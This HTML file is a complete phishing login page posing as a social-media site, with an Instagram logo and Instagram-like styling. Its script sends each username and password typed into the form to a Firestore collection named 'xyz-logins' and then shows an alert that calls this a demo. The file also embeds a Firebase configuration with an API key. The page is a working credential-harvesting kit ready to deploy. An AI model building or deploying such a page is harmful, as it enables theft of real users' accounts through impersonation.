<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XYZ Social Media - Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #fafafa;
            font-family: Arial, sans-serif;
        }
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            width: 300px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        input {
            display: block;
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            border: none;
            color: white;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #0073e6;
        }
    </style>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
</head>
<body>
    <div class="login-box">
        <img src="./instagram.png" width="200px" height="200px">
        <form id="loginForm">
            <input type="text" id="username" placeholder="Enter Username" required>
            <input type="password" id="password" placeholder="Enter Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        // Your Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyByKSUsC642IfINWogTnw2XskTgk6HXnX4",
            authDomain: "xyz-social-demo.firebaseapp.com",
            projectId: "xyz-social-demo",
            storageBucket: "xyz-social-demo.firebasestorage.app",
            messagingSenderId: "588536202737",
            appId: "1:588536202737:web:b8d4f4412a357245a37050",
            measurementId: "G-T2TMB8B5R1"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // Form submission handler
        document.getElementById("loginForm").addEventListener("submit", function (e) {
            e.preventDefault();

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            db.collection("xyz-logins").add({
                username: username,
                password: password,
                timestamp: new Date()
            }).then(() => {
                alert("Demo: Data saved to Firestore!");
                document.getElementById("loginForm").reset();
            }).catch((error) => {
                console.error("Error saving data: ", error);
            });
        });
    </script>
</body>
</html>
